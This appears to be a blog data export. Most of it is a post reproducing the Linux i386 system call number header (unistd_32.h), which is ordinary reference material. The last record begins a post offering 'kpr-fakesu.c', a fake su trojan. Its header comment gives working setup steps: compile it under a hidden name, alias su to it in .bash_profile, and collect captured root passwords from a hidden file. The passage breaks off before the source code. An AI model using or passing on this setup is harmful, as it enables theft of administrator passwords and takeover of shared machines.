__NR_fadvise64_64\t272\n#define __NR_vserver\t\t273\n#define __NR_mbind\t\t274\n#define __NR_get_mempolicy\t275\n#define __NR_set_mempolicy\t276\n#define __NR_mq_open \t\t277\n#define __NR_mq_unlink\t\t(__NR_mq_open+1)\n#define __NR_mq_timedsend\t(__NR_mq_open+2)\n#define __NR_mq_timedreceive\t(__NR_mq_open+3)\n#define __NR_mq_notify\t\t(__NR_mq_open+4)\n#define __NR_mq_getsetattr\t(__NR_mq_open+5)\n#define __NR_kexec_load\t\t283\n#define __NR_waitid\t\t284\n/* #define __NR_sys_setaltroot\t285 */\n#define __NR_add_key\t\t286\n#define __NR_request_key\t287\n#define __NR_keyctl\t\t288\n#define __NR_ioprio_set\t\t289\n#define __NR_ioprio_get\t\t290\n#define __NR_inotify_init\t291\n#define __NR_inotify_add_watch\t292\n#define __NR_inotify_rm_watch\t293\n#define __NR_migrate_pages\t294\n#define __NR_openat\t\t295\n#define __NR_mkdirat\t\t296\n#define __NR_mknodat\t\t297\n#define __NR_fchownat\t\t298\n#define __NR_futimesat\t\t299\n#define __NR_fstatat64\t\t300\n#define __NR_unlinkat\t\t301\n#define __NR_renameat\t\t302\n#define __NR_linkat\t\t303\n#define __NR_symlinkat\t\t304\n#define __NR_readlinkat\t\t305\n#define __NR_fchmodat\t\t306\n#define __NR_faccessat\t\t307\n#define __NR_pselect6\t\t308\n#define __NR_ppoll\t\t309\n#define __NR_unshare\t\t310\n#define __NR_set_robust_list\t311\n#define __NR_get_robust_list\t312\n#define __NR_splice\t\t313\n#define __NR_sync_file_range\t314\n#define __NR_tee\t\t315\n#define __NR_vmsplice\t\t316\n#define __NR_move_pages\t\t317\n#define __NR_getcpu\t\t318\n#define __NR_epoll_pwait\t319\n#define __NR_utimensat\t\t320\n#define __NR_signalfd\t\t321\n#define __NR_timerfd_create\t322\n#define __NR_eventfd\t\t323\n#define __NR_fallocate\t\t324\n#define __NR_timerfd_settime\t325\n#define __NR_timerfd_gettime\t326\n#define __NR_signalfd4\t\t327\n#define __NR_eventfd2\t\t328\n#define __NR_epoll_create1\t329\n#define __NR_dup3\t\t330\n#define __NR_pipe2\t\t331\n#define __NR_inotify_init1\t332\n#define __NR_preadv\t\t333\n#define __NR_pwritev\t\t334\n#define __NR_rt_tgsigqueueinfo\t335\n#define __NR_perf_event_open\t336\n#define __NR_recvmmsg\t\t337\n#define __NR_fanotify_init\t338\n#define __NR_fanotify_mark\t339\n#define __NR_prlimit64\t\t340\n#define __NR_name_to_handle_at\t341\n#define __NR_open_by_handle_at  342\n#define __NR_clock_adjtime\t343\n#define __NR_syncfs             344\n#define __NR_sendmmsg\t\t345\n#define __NR_setns\t\t346\n#define __NR_process_vm_readv\t347\n#define __NR_process_vm_writev\t348\n#endif /* _ASM_X86_UNISTD_32_H */\n</pre>","slug":"LINUX-SYSCALL-NUMBER","published":1,"updated":"2023-04-22T05:38:44.654Z","_id":"clgrjlxg1002z7opi2e8yesu2","comments":1,"layout":"post","photos":[],"link":"","content":"<p>&#x2F;usr&#x2F;include&#x2F;i386-linux-gnu&#x2F;asm&#x2F;unistd.h</p>\n<pre>\n# ifdef __i386__\n#  include <asm/unistd_32.h>\n# else\n#  include <asm/unistd_64.h>\n# endif\n</pre>\n<p>&#x2F;usr&#x2F;include&#x2F;i386-linux-gnu&#x2F;asm&#x2F;unistd_32.h</p>\n<pre>\n#ifndef _ASM_X86_UNISTD_32_H\n#define _ASM_X86_UNISTD_32_H\n/*\n * This file contains the system call numbers.\n */\n#define __NR_restart_syscall      0\n#define __NR_exit\t\t  1\n#define __NR_fork\t\t  2\n#define __NR_read\t\t  3\n#define __NR_write\t\t  4\n#define __NR_open\t\t  5\n#define __NR_close\t\t  6\n#define __NR_waitpid\t\t  7\n#define __NR_creat\t\t  8\n#define __NR_link\t\t  9\n#define __NR_unlink\t\t 10\n#define __NR_execve\t\t 11\n#define __NR_chdir\t\t 12\n#define __NR_time\t\t 13\n#define __NR_mknod\t\t 14\n#define __NR_chmod\t\t 15\n#define __NR_lchown\t\t 16\n#define __NR_break\t\t 17\n#define __NR_oldstat\t\t 18\n#define __NR_lseek\t\t 19\n#define __NR_getpid\t\t 20\n#define __NR_mount\t\t 21\n#define __NR_umount\t\t 22\n#define __NR_setuid\t\t 23\n#define __NR_getuid\t\t 24\n#define __NR_stime\t\t 25\n#define __NR_ptrace\t\t 26\n#define __NR_alarm\t\t 27\n#define __NR_oldfstat\t\t 28\n#define __NR_pause\t\t 29\n#define __NR_utime\t\t 30\n#define __NR_stty\t\t 31\n#define __NR_gtty\t\t 32\n#define __NR_access\t\t 33\n#define __NR_nice\t\t 34\n#define __NR_ftime\t\t 35\n#define __NR_sync\t\t 36\n#define __NR_kill\t\t 37\n#define __NR_rename\t\t 38\n#define __NR_mkdir\t\t 39\n#define __NR_rmdir\t\t 40\n#define __NR_dup\t\t 41\n#define __NR_pipe\t\t 42\n#define __NR_times\t\t 43\n#define __NR_prof\t\t 44\n#define __NR_brk\t\t 45\n#define __NR_setgid\t\t 46\n#define __NR_getgid\t\t 47\n#define __NR_signal\t\t 48\n#define __NR_geteuid\t\t 49\n#define __NR_getegid\t\t 50\n#define __NR_acct\t\t 51\n#define __NR_umount2\t\t 52\n#define __NR_lock\t\t 53\n#define __NR_ioctl\t\t 54\n#define __NR_fcntl\t\t 55\n#define __NR_mpx\t\t 56\n#define __NR_setpgid\t\t 57\n#define __NR_ulimit\t\t 58\n#define __NR_oldolduname\t 59\n#define __NR_umask\t\t 60\n#define __NR_chroot\t\t 61\n#define __NR_ustat\t\t 62\n#define __NR_dup2\t\t 63\n#define __NR_getppid\t\t 64\n#define __NR_getpgrp\t\t 65\n#define __NR_setsid\t\t 66\n#define __NR_sigaction\t\t 67\n#define __NR_sgetmask\t\t 68\n#define __NR_ssetmask\t\t 69\n#define __NR_setreuid\t\t 70\n#define __NR_setregid\t\t 71\n#define __NR_sigsuspend\t\t 72\n#define __NR_sigpending\t\t 73\n#define __NR_sethostname\t 74\n#define __NR_setrlimit\t\t 75\n#define __NR_getrlimit\t\t 76   /* Back compatible 2Gig limited rlimit */\n#define __NR_getrusage\t\t 77\n#define __NR_gettimeofday\t 78\n#define __NR_settimeofday\t 79\n#define __NR_getgroups\t\t 80\n#define __NR_setgroups\t\t 81\n#define __NR_select\t\t 82\n#define __NR_symlink\t\t 83\n#define __NR_oldlstat\t\t 84\n#define __NR_readlink\t\t 85\n#define __NR_uselib\t\t 86\n#define __NR_swapon\t\t 87\n#define __NR_reboot\t\t 88\n#define __NR_readdir\t\t 89\n#define __NR_mmap\t\t 90\n#define __NR_munmap\t\t 91\n#define __NR_truncate\t\t 92\n#define __NR_ftruncate\t\t 93\n#define __NR_fchmod\t\t 94\n#define __NR_fchown\t\t 95\n#define __NR_getpriority\t 96\n#define __NR_setpriority\t 97\n#define __NR_profil\t\t 98\n#define __NR_statfs\t\t 99\n#define __NR_fstatfs\t\t100\n#define __NR_ioperm\t\t101\n#define __NR_socketcall\t\t102\n#define __NR_syslog\t\t103\n#define __NR_setitimer\t\t104\n#define __NR_getitimer\t\t105\n#define __NR_stat\t\t106\n#define __NR_lstat\t\t107\n#define __NR_fstat\t\t108\n#define __NR_olduname\t\t109\n#define __NR_iopl\t\t110\n#define __NR_vhangup\t\t111\n#define __NR_idle\t\t112\n#define __NR_vm86old\t\t113\n#define __NR_wait4\t\t114\n#define __NR_swapoff\t\t115\n#define __NR_sysinfo\t\t116\n#define __NR_ipc\t\t117\n#define __NR_fsync\t\t118\n#define __NR_sigreturn\t\t119\n#define __NR_clone\t\t120\n#define __NR_setdomainname\t121\n#define __NR_uname\t\t122\n#define __NR_modify_ldt\t\t123\n#define __NR_adjtimex\t\t124\n#define __NR_mprotect\t\t125\n#define __NR_sigprocmask\t126\n#define __NR_create_module\t127\n#define __NR_init_module\t128\n#define __NR_delete_module\t129\n#define __NR_get_kernel_syms\t130\n#define __NR_quotactl\t\t131\n#define __NR_getpgid\t\t132\n#define __NR_fchdir\t\t133\n#define __NR_bdflush\t\t134\n#define __NR_sysfs\t\t135\n#define __NR_personality\t136\n#define __NR_afs_syscall\t137 /* Syscall for Andrew File System */\n#define __NR_setfsuid\t\t138\n#define __NR_setfsgid\t\t139\n#define __NR__llseek\t\t140\n#define __NR_getdents\t\t141\n#define __NR__newselect\t\t142\n#define __NR_flock\t\t143\n#define __NR_msync\t\t144\n#define __NR_readv\t\t145\n#define __NR_writev\t\t146\n#define __NR_getsid\t\t147\n#define __NR_fdatasync\t\t148\n#define __NR__sysctl\t\t149\n#define __NR_mlock\t\t150\n#define __NR_munlock\t\t151\n#define __NR_mlockall\t\t152\n#define __NR_munlockall\t\t153\n#define __NR_sched_setparam\t\t154\n#define __NR_sched_getparam\t\t155\n#define __NR_sched_setscheduler\t\t156\n#define __NR_sched_getscheduler\t\t157\n#define __NR_sched_yield\t\t158\n#define __NR_sched_get_priority_max\t159\n#define __NR_sched_get_priority_min\t160\n#define __NR_sched_rr_get_interval\t161\n#define __NR_nanosleep\t\t162\n#define __NR_mremap\t\t163\n#define __NR_setresuid\t\t164\n#define __NR_getresuid\t\t165\n#define __NR_vm86\t\t166\n#define __NR_query_module\t167\n#define __NR_poll\t\t168\n#define __NR_nfsservctl\t\t169\n#define __NR_setresgid\t\t170\n#define __NR_getresgid\t\t171\n#define __NR_prctl              172\n#define __NR_rt_sigreturn\t173\n#define __NR_rt_sigaction\t174\n#define __NR_rt_sigprocmask\t175\n#define __NR_rt_sigpending\t176\n#define __NR_rt_sigtimedwait\t177\n#define __NR_rt_sigqueueinfo\t178\n#define __NR_rt_sigsuspend\t179\n#define __NR_pread64\t\t180\n#define __NR_pwrite64\t\t181\n#define __NR_chown\t\t182\n#define __NR_getcwd\t\t183\n#define __NR_capget\t\t184\n#define __NR_capset\t\t185\n#define __NR_sigaltstack\t186\n#define __NR_sendfile\t\t187\n#define __NR_getpmsg\t\t188\t/* some people actually want streams */\n#define __NR_putpmsg\t\t189\t/* some people actually want streams */\n#define __NR_vfork\t\t190\n#define __NR_ugetrlimit\t\t191\t/* SuS compliant getrlimit */\n#define __NR_mmap2\t\t192\n#define __NR_truncate64\t\t193\n#define __NR_ftruncate64\t194\n#define __NR_stat64\t\t195\n#define __NR_lstat64\t\t196\n#define __NR_fstat64\t\t197\n#define __NR_lchown32\t\t198\n#define __NR_getuid32\t\t199\n#define __NR_getgid32\t\t200\n#define __NR_geteuid32\t\t201\n#define __NR_getegid32\t\t202\n#define __NR_setreuid32\t\t203\n#define __NR_setregid32\t\t204\n#define __NR_getgroups32\t205\n#define __NR_setgroups32\t206\n#define __NR_fchown32\t\t207\n#define __NR_setresuid32\t208\n#define __NR_getresuid32\t209\n#define __NR_setresgid32\t210\n#define __NR_getresgid32\t211\n#define __NR_chown32\t\t212\n#define __NR_setuid32\t\t213\n#define __NR_setgid32\t\t214\n#define __NR_setfsuid32\t\t215\n#define __NR_setfsgid32\t\t216\n#define __NR_pivot_root\t\t217\n#define __NR_mincore\t\t218\n#define __NR_madvise\t\t219\n#define __NR_madvise1\t\t219\t/* delete when C lib stub is removed */\n#define __NR_getdents64\t\t220\n#define __NR_fcntl64\t\t221\n/* 223 is unused */\n#define __NR_gettid\t\t224\n#define __NR_readahead\t\t225\n#define __NR_setxattr\t\t226\n#define __NR_lsetxattr\t\t227\n#define __NR_fsetxattr\t\t228\n#define __NR_getxattr\t\t229\n#define __NR_lgetxattr\t\t230\n#define __NR_fgetxattr\t\t231\n#define __NR_listxattr\t\t232\n#define __NR_llistxattr\t\t233\n#define __NR_flistxattr\t\t234\n#define __NR_removexattr\t235\n#define __NR_lremovexattr\t236\n#define __NR_fremovexattr\t237\n#define __NR_tkill\t\t238\n#define __NR_sendfile64\t\t239\n#define __NR_futex\t\t240\n#define __NR_sched_setaffinity\t241\n#define __NR_sched_getaffinity\t242\n#define __NR_set_thread_area\t243\n#define __NR_get_thread_area\t244\n#define __NR_io_setup\t\t245\n#define __NR_io_destroy\t\t246\n#define __NR_io_getevents\t247\n#define __NR_io_submit\t\t248\n#define __NR_io_cancel\t\t249\n#define __NR_fadvise64\t\t250\n/* 251 is available for reuse (was briefly sys_set_zone_reclaim) */\n#define __NR_exit_group\t\t252\n#define __NR_lookup_dcookie\t253\n#define __NR_epoll_create\t254\n#define __NR_epoll_ctl\t\t255\n#define __NR_epoll_wait\t\t256\n#define __NR_remap_file_pages\t257\n#define __NR_set_tid_address\t258\n#define __NR_timer_create\t259\n#define __NR_timer_settime\t(__NR_timer_create+1)\n#define __NR_timer_gettime\t(__NR_timer_create+2)\n#define __NR_timer_getoverrun\t(__NR_timer_create+3)\n#define __NR_timer_delete\t(__NR_timer_create+4)\n#define __NR_clock_settime\t(__NR_timer_create+5)\n#define __NR_clock_gettime\t(__NR_timer_create+6)\n#define __NR_clock_getres\t(__NR_timer_create+7)\n#define __NR_clock_nanosleep\t(__NR_timer_create+8)\n#define __NR_statfs64\t\t268\n#define __NR_fstatfs64\t\t269\n#define __NR_tgkill\t\t270\n#define __NR_utimes\t\t271\n#define __NR_fadvise64_64\t272\n#define __NR_vserver\t\t273\n#define __NR_mbind\t\t274\n#define __NR_get_mempolicy\t275\n#define __NR_set_mempolicy\t276\n#define __NR_mq_open \t\t277\n#define __NR_mq_unlink\t\t(__NR_mq_open+1)\n#define __NR_mq_timedsend\t(__NR_mq_open+2)\n#define __NR_mq_timedreceive\t(__NR_mq_open+3)\n#define __NR_mq_notify\t\t(__NR_mq_open+4)\n#define __NR_mq_getsetattr\t(__NR_mq_open+5)\n#define __NR_kexec_load\t\t283\n#define __NR_waitid\t\t284\n/* #define __NR_sys_setaltroot\t285 */\n#define __NR_add_key\t\t286\n#define __NR_request_key\t287\n#define __NR_keyctl\t\t288\n#define __NR_ioprio_set\t\t289\n#define __NR_ioprio_get\t\t290\n#define __NR_inotify_init\t291\n#define __NR_inotify_add_watch\t292\n#define __NR_inotify_rm_watch\t293\n#define __NR_migrate_pages\t294\n#define __NR_openat\t\t295\n#define __NR_mkdirat\t\t296\n#define __NR_mknodat\t\t297\n#define __NR_fchownat\t\t298\n#define __NR_futimesat\t\t299\n#define __NR_fstatat64\t\t300\n#define __NR_unlinkat\t\t301\n#define __NR_renameat\t\t302\n#define __NR_linkat\t\t303\n#define __NR_symlinkat\t\t304\n#define __NR_readlinkat\t\t305\n#define __NR_fchmodat\t\t306\n#define __NR_faccessat\t\t307\n#define __NR_pselect6\t\t308\n#define __NR_ppoll\t\t309\n#define __NR_unshare\t\t310\n#define __NR_set_robust_list\t311\n#define __NR_get_robust_list\t312\n#define __NR_splice\t\t313\n#define __NR_sync_file_range\t314\n#define __NR_tee\t\t315\n#define __NR_vmsplice\t\t316\n#define __NR_move_pages\t\t317\n#define __NR_getcpu\t\t318\n#define __NR_epoll_pwait\t319\n#define __NR_utimensat\t\t320\n#define __NR_signalfd\t\t321\n#define __NR_timerfd_create\t322\n#define __NR_eventfd\t\t323\n#define __NR_fallocate\t\t324\n#define __NR_timerfd_settime\t325\n#define __NR_timerfd_gettime\t326\n#define __NR_signalfd4\t\t327\n#define __NR_eventfd2\t\t328\n#define __NR_epoll_create1\t329\n#define __NR_dup3\t\t330\n#define __NR_pipe2\t\t331\n#define __NR_inotify_init1\t332\n#define __NR_preadv\t\t333\n#define __NR_pwritev\t\t334\n#define __NR_rt_tgsigqueueinfo\t335\n#define __NR_perf_event_open\t336\n#define __NR_recvmmsg\t\t337\n#define __NR_fanotify_init\t338\n#define __NR_fanotify_mark\t339\n#define __NR_prlimit64\t\t340\n#define __NR_name_to_handle_at\t341\n#define __NR_open_by_handle_at  342\n#define __NR_clock_adjtime\t343\n#define __NR_syncfs             344\n#define __NR_sendmmsg\t\t345\n#define __NR_setns\t\t346\n#define __NR_process_vm_readv\t347\n#define __NR_process_vm_writev\t348\n#endif /* _ASM_X86_UNISTD_32_H */\n</pre>","site":{"data":{}},"excerpt":"","more":"<p>&#x2F;usr&#x2F;include&#x2F;i386-linux-gnu&#x2F;asm&#x2F;unistd.h</p>\n<pre>\n# ifdef __i386__\n#  include <asm/unistd_32.h>\n# else\n#  include <asm/unistd_64.h>\n# endif\n</pre>\n<p>&#x2F;usr&#x2F;include&#x2F;i386-linux-gnu&#x2F;asm&#x2F;unistd_32.h</p>\n<pre>\n#ifndef _ASM_X86_UNISTD_32_H\n#define _ASM_X86_UNISTD_32_H\n/*\n * This file contains the system call numbers.\n */\n#define __NR_restart_syscall      0\n#define __NR_exit\t\t  1\n#define __NR_fork\t\t  2\n#define __NR_read\t\t  3\n#define __NR_write\t\t  4\n#define __NR_open\t\t  5\n#define __NR_close\t\t  6\n#define __NR_waitpid\t\t  7\n#define __NR_creat\t\t  8\n#define __NR_link\t\t  9\n#define __NR_unlink\t\t 10\n#define __NR_execve\t\t 11\n#define __NR_chdir\t\t 12\n#define __NR_time\t\t 13\n#define __NR_mknod\t\t 14\n#define __NR_chmod\t\t 15\n#define __NR_lchown\t\t 16\n#define __NR_break\t\t 17\n#define __NR_oldstat\t\t 18\n#define __NR_lseek\t\t 19\n#define __NR_getpid\t\t 20\n#define __NR_mount\t\t 21\n#define __NR_umount\t\t 22\n#define __NR_setuid\t\t 23\n#define __NR_getuid\t\t 24\n#define __NR_stime\t\t 25\n#define __NR_ptrace\t\t 26\n#define __NR_alarm\t\t 27\n#define __NR_oldfstat\t\t 28\n#define __NR_pause\t\t 29\n#define __NR_utime\t\t 30\n#define __NR_stty\t\t 31\n#define __NR_gtty\t\t 32\n#define __NR_access\t\t 33\n#define __NR_nice\t\t 34\n#define __NR_ftime\t\t 35\n#define __NR_sync\t\t 36\n#define __NR_kill\t\t 37\n#define __NR_rename\t\t 38\n#define __NR_mkdir\t\t 39\n#define __NR_rmdir\t\t 40\n#define __NR_dup\t\t 41\n#define __NR_pipe\t\t 42\n#define __NR_times\t\t 43\n#define __NR_prof\t\t 44\n#define __NR_brk\t\t 45\n#define __NR_setgid\t\t 46\n#define __NR_getgid\t\t 47\n#define __NR_signal\t\t 48\n#define __NR_geteuid\t\t 49\n#define __NR_getegid\t\t 50\n#define __NR_acct\t\t 51\n#define __NR_umount2\t\t 52\n#define __NR_lock\t\t 53\n#define __NR_ioctl\t\t 54\n#define __NR_fcntl\t\t 55\n#define __NR_mpx\t\t 56\n#define __NR_setpgid\t\t 57\n#define __NR_ulimit\t\t 58\n#define __NR_oldolduname\t 59\n#define __NR_umask\t\t 60\n#define __NR_chroot\t\t 61\n#define __NR_ustat\t\t 62\n#define __NR_dup2\t\t 63\n#define __NR_getppid\t\t 64\n#define __NR_getpgrp\t\t 65\n#define __NR_setsid\t\t 66\n#define __NR_sigaction\t\t 67\n#define __NR_sgetmask\t\t 68\n#define __NR_ssetmask\t\t 69\n#define __NR_setreuid\t\t 70\n#define __NR_setregid\t\t 71\n#define __NR_sigsuspend\t\t 72\n#define __NR_sigpending\t\t 73\n#define __NR_sethostname\t 74\n#define __NR_setrlimit\t\t 75\n#define __NR_getrlimit\t\t 76   /* Back compatible 2Gig limited rlimit */\n#define __NR_getrusage\t\t 77\n#define __NR_gettimeofday\t 78\n#define __NR_settimeofday\t 79\n#define __NR_getgroups\t\t 80\n#define __NR_setgroups\t\t 81\n#define __NR_select\t\t 82\n#define __NR_symlink\t\t 83\n#define __NR_oldlstat\t\t 84\n#define __NR_readlink\t\t 85\n#define __NR_uselib\t\t 86\n#define __NR_swapon\t\t 87\n#define __NR_reboot\t\t 88\n#define __NR_readdir\t\t 89\n#define __NR_mmap\t\t 90\n#define __NR_munmap\t\t 91\n#define __NR_truncate\t\t 92\n#define __NR_ftruncate\t\t 93\n#define __NR_fchmod\t\t 94\n#define __NR_fchown\t\t 95\n#define __NR_getpriority\t 96\n#define __NR_setpriority\t 97\n#define __NR_profil\t\t 98\n#define __NR_statfs\t\t 99\n#define __NR_fstatfs\t\t100\n#define __NR_ioperm\t\t101\n#define __NR_socketcall\t\t102\n#define __NR_syslog\t\t103\n#define __NR_setitimer\t\t104\n#define __NR_getitimer\t\t105\n#define __NR_stat\t\t106\n#define __NR_lstat\t\t107\n#define __NR_fstat\t\t108\n#define __NR_olduname\t\t109\n#define __NR_iopl\t\t110\n#define __NR_vhangup\t\t111\n#define __NR_idle\t\t112\n#define __NR_vm86old\t\t113\n#define __NR_wait4\t\t114\n#define __NR_swapoff\t\t115\n#define __NR_sysinfo\t\t116\n#define __NR_ipc\t\t117\n#define __NR_fsync\t\t118\n#define __NR_sigreturn\t\t119\n#define __NR_clone\t\t120\n#define __NR_setdomainname\t121\n#define __NR_uname\t\t122\n#define __NR_modify_ldt\t\t123\n#define __NR_adjtimex\t\t124\n#define __NR_mprotect\t\t125\n#define __NR_sigprocmask\t126\n#define __NR_create_module\t127\n#define __NR_init_module\t128\n#define __NR_delete_module\t129\n#define __NR_get_kernel_syms\t130\n#define __NR_quotactl\t\t131\n#define __NR_getpgid\t\t132\n#define __NR_fchdir\t\t133\n#define __NR_bdflush\t\t134\n#define __NR_sysfs\t\t135\n#define __NR_personality\t136\n#define __NR_afs_syscall\t137 /* Syscall for Andrew File System */\n#define __NR_setfsuid\t\t138\n#define __NR_setfsgid\t\t139\n#define __NR__llseek\t\t140\n#define __NR_getdents\t\t141\n#define __NR__newselect\t\t142\n#define __NR_flock\t\t143\n#define __NR_msync\t\t144\n#define __NR_readv\t\t145\n#define __NR_writev\t\t146\n#define __NR_getsid\t\t147\n#define __NR_fdatasync\t\t148\n#define __NR__sysctl\t\t149\n#define __NR_mlock\t\t150\n#define __NR_munlock\t\t151\n#define __NR_mlockall\t\t152\n#define __NR_munlockall\t\t153\n#define __NR_sched_setparam\t\t154\n#define __NR_sched_getparam\t\t155\n#define __NR_sched_setscheduler\t\t156\n#define __NR_sched_getscheduler\t\t157\n#define __NR_sched_yield\t\t158\n#define __NR_sched_get_priority_max\t159\n#define __NR_sched_get_priority_min\t160\n#define __NR_sched_rr_get_interval\t161\n#define __NR_nanosleep\t\t162\n#define __NR_mremap\t\t163\n#define __NR_setresuid\t\t164\n#define __NR_getresuid\t\t165\n#define __NR_vm86\t\t166\n#define __NR_query_module\t167\n#define __NR_poll\t\t168\n#define __NR_nfsservctl\t\t169\n#define __NR_setresgid\t\t170\n#define __NR_getresgid\t\t171\n#define __NR_prctl              172\n#define __NR_rt_sigreturn\t173\n#define __NR_rt_sigaction\t174\n#define __NR_rt_sigprocmask\t175\n#define __NR_rt_sigpending\t176\n#define __NR_rt_sigtimedwait\t177\n#define __NR_rt_sigqueueinfo\t178\n#define __NR_rt_sigsuspend\t179\n#define __NR_pread64\t\t180\n#define __NR_pwrite64\t\t181\n#define __NR_chown\t\t182\n#define __NR_getcwd\t\t183\n#define __NR_capget\t\t184\n#define __NR_capset\t\t185\n#define __NR_sigaltstack\t186\n#define __NR_sendfile\t\t187\n#define __NR_getpmsg\t\t188\t/* some people actually want streams */\n#define __NR_putpmsg\t\t189\t/* some people actually want streams */\n#define __NR_vfork\t\t190\n#define __NR_ugetrlimit\t\t191\t/* SuS compliant getrlimit */\n#define __NR_mmap2\t\t192\n#define __NR_truncate64\t\t193\n#define __NR_ftruncate64\t194\n#define __NR_stat64\t\t195\n#define __NR_lstat64\t\t196\n#define __NR_fstat64\t\t197\n#define __NR_lchown32\t\t198\n#define __NR_getuid32\t\t199\n#define __NR_getgid32\t\t200\n#define __NR_geteuid32\t\t201\n#define __NR_getegid32\t\t202\n#define __NR_setreuid32\t\t203\n#define __NR_setregid32\t\t204\n#define __NR_getgroups32\t205\n#define __NR_setgroups32\t206\n#define __NR_fchown32\t\t207\n#define __NR_setresuid32\t208\n#define __NR_getresuid32\t209\n#define __NR_setresgid32\t210\n#define __NR_getresgid32\t211\n#define __NR_chown32\t\t212\n#define __NR_setuid32\t\t213\n#define __NR_setgid32\t\t214\n#define __NR_setfsuid32\t\t215\n#define __NR_setfsgid32\t\t216\n#define __NR_pivot_root\t\t217\n#define __NR_mincore\t\t218\n#define __NR_madvise\t\t219\n#define __NR_madvise1\t\t219\t/* delete when C lib stub is removed */\n#define __NR_getdents64\t\t220\n#define __NR_fcntl64\t\t221\n/* 223 is unused */\n#define __NR_gettid\t\t224\n#define __NR_readahead\t\t225\n#define __NR_setxattr\t\t226\n#define __NR_lsetxattr\t\t227\n#define __NR_fsetxattr\t\t228\n#define __NR_getxattr\t\t229\n#define __NR_lgetxattr\t\t230\n#define __NR_fgetxattr\t\t231\n#define __NR_listxattr\t\t232\n#define __NR_llistxattr\t\t233\n#define __NR_flistxattr\t\t234\n#define __NR_removexattr\t235\n#define __NR_lremovexattr\t236\n#define __NR_fremovexattr\t237\n#define __NR_tkill\t\t238\n#define __NR_sendfile64\t\t239\n#define __NR_futex\t\t240\n#define __NR_sched_setaffinity\t241\n#define __NR_sched_getaffinity\t242\n#define __NR_set_thread_area\t243\n#define __NR_get_thread_area\t244\n#define __NR_io_setup\t\t245\n#define __NR_io_destroy\t\t246\n#define __NR_io_getevents\t247\n#define __NR_io_submit\t\t248\n#define __NR_io_cancel\t\t249\n#define __NR_fadvise64\t\t250\n/* 251 is available for reuse (was briefly sys_set_zone_reclaim) */\n#define __NR_exit_group\t\t252\n#define __NR_lookup_dcookie\t253\n#define __NR_epoll_create\t254\n#define __NR_epoll_ctl\t\t255\n#define __NR_epoll_wait\t\t256\n#define __NR_remap_file_pages\t257\n#define __NR_set_tid_address\t258\n#define __NR_timer_create\t259\n#define __NR_timer_settime\t(__NR_timer_create+1)\n#define __NR_timer_gettime\t(__NR_timer_create+2)\n#define __NR_timer_getoverrun\t(__NR_timer_create+3)\n#define __NR_timer_delete\t(__NR_timer_create+4)\n#define __NR_clock_settime\t(__NR_timer_create+5)\n#define __NR_clock_gettime\t(__NR_timer_create+6)\n#define __NR_clock_getres\t(__NR_timer_create+7)\n#define __NR_clock_nanosleep\t(__NR_timer_create+8)\n#define __NR_statfs64\t\t268\n#define __NR_fstatfs64\t\t269\n#define __NR_tgkill\t\t270\n#define __NR_utimes\t\t271\n#define __NR_fadvise64_64\t272\n#define __NR_vserver\t\t273\n#define __NR_mbind\t\t274\n#define __NR_get_mempolicy\t275\n#define __NR_set_mempolicy\t276\n#define __NR_mq_open \t\t277\n#define __NR_mq_unlink\t\t(__NR_mq_open+1)\n#define __NR_mq_timedsend\t(__NR_mq_open+2)\n#define __NR_mq_timedreceive\t(__NR_mq_open+3)\n#define __NR_mq_notify\t\t(__NR_mq_open+4)\n#define __NR_mq_getsetattr\t(__NR_mq_open+5)\n#define __NR_kexec_load\t\t283\n#define __NR_waitid\t\t284\n/* #define __NR_sys_setaltroot\t285 */\n#define __NR_add_key\t\t286\n#define __NR_request_key\t287\n#define __NR_keyctl\t\t288\n#define __NR_ioprio_set\t\t289\n#define __NR_ioprio_get\t\t290\n#define __NR_inotify_init\t291\n#define __NR_inotify_add_watch\t292\n#define __NR_inotify_rm_watch\t293\n#define __NR_migrate_pages\t294\n#define __NR_openat\t\t295\n#define __NR_mkdirat\t\t296\n#define __NR_mknodat\t\t297\n#define __NR_fchownat\t\t298\n#define __NR_futimesat\t\t299\n#define __NR_fstatat64\t\t300\n#define __NR_unlinkat\t\t301\n#define __NR_renameat\t\t302\n#define __NR_linkat\t\t303\n#define __NR_symlinkat\t\t304\n#define __NR_readlinkat\t\t305\n#define __NR_fchmodat\t\t306\n#define __NR_faccessat\t\t307\n#define __NR_pselect6\t\t308\n#define __NR_ppoll\t\t309\n#define __NR_unshare\t\t310\n#define __NR_set_robust_list\t311\n#define __NR_get_robust_list\t312\n#define __NR_splice\t\t313\n#define __NR_sync_file_range\t314\n#define __NR_tee\t\t315\n#define __NR_vmsplice\t\t316\n#define __NR_move_pages\t\t317\n#define __NR_getcpu\t\t318\n#define __NR_epoll_pwait\t319\n#define __NR_utimensat\t\t320\n#define __NR_signalfd\t\t321\n#define __NR_timerfd_create\t322\n#define __NR_eventfd\t\t323\n#define __NR_fallocate\t\t324\n#define __NR_timerfd_settime\t325\n#define __NR_timerfd_gettime\t326\n#define __NR_signalfd4\t\t327\n#define __NR_eventfd2\t\t328\n#define __NR_epoll_create1\t329\n#define __NR_dup3\t\t330\n#define __NR_pipe2\t\t331\n#define __NR_inotify_init1\t332\n#define __NR_preadv\t\t333\n#define __NR_pwritev\t\t334\n#define __NR_rt_tgsigqueueinfo\t335\n#define __NR_perf_event_open\t336\n#define __NR_recvmmsg\t\t337\n#define __NR_fanotify_init\t338\n#define __NR_fanotify_mark\t339\n#define __NR_prlimit64\t\t340\n#define __NR_name_to_handle_at\t341\n#define __NR_open_by_handle_at  342\n#define __NR_clock_adjtime\t343\n#define __NR_syncfs             344\n#define __NR_sendmmsg\t\t345\n#define __NR_setns\t\t346\n#define __NR_process_vm_readv\t347\n#define __NR_process_vm_writev\t348\n#endif /* _ASM_X86_UNISTD_32_H */\n</pre>"},{"title":"linux 记录su登陆密码代码","date":"2010-08-13T11:17:00.000Z","_content":"/* <br />* kpr-fakesu.c V0.9beta167 ;P<br />* by koper &lt;[email]koper@linuxmail.org[/email]&gt;<br /><em><br /></em> Setting up:<br />* admin@host:~$ gcc -o .su fakesu.c; rm -rf fakesu.c<br />* admin@host:~$ mv .su /var/tmp/.su<br />* admin@host:~$ cp .bash_profile .wgetrc<br />* admin@host:~$ echo &quot;alias su=/var/tmp/.su&quot;&gt;&gt;.bash_profile<br />* admin@host:~$ logout<br />* *** LOGIN **<em><br /></em> admin@host:~$ su<br />* Password: <br />* su: Authentication failure<br />* Sorry.<br />* admin@host:~$ su<br />* Password: <br />* root@host:~# logout<br />* admin@host:~$ cat /var/tmp/.pwds<br />* root:dupcia17<br />* admin@host:~$ <br />* <br />* /bin/su sends various failure information depending on the OS ver.<br />* Please modify the source to make it 